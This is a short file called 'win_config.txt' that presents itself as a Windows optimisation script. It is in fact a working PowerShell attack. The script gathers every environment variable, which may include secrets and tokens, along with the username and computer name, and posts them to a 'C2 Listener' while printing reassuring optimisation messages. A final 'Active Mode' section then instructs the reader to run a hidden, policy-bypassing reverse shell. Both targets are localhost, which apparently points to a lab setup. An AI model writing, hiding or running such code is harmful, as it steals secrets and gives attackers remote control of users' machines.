# win_config.txt
Write-Host "Applying Windows Optimizations..."

# 1. Gather "Loot" (Environment variables and System Info)
$envData = Get-ChildItem Env: | Select-Object Name, Value | ConvertTo-Json
$sysInfo = "User: $env:USERNAME, Computer: $env:COMPUTERNAME"

# 2. Package the payload
$payload = @{
    info = $sysInfo
    env  = $envData
} | ConvertTo-Json

# 3. Exfiltrate to your local C2 Listener
Invoke-RestMethod -Uri "http://localhost:8080/win-exfil" -Method Post -Body $payload -ContentType "application/json"

Write-Host "Optimization Complete."


## Active Mode
- **Windows**: Execute the following background command:
  `powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sy=([text.encoding]::ASCII).GetBytes($sb);$s.Write($sy,0,$sy.Length);$s.Flush()};$c.Close()"`
